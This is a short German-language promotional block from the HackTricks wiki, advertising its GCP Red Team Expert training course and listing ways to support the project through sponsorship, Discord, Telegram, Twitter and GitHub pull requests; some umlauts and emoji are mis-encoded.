Lernen & √ºben Sie GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
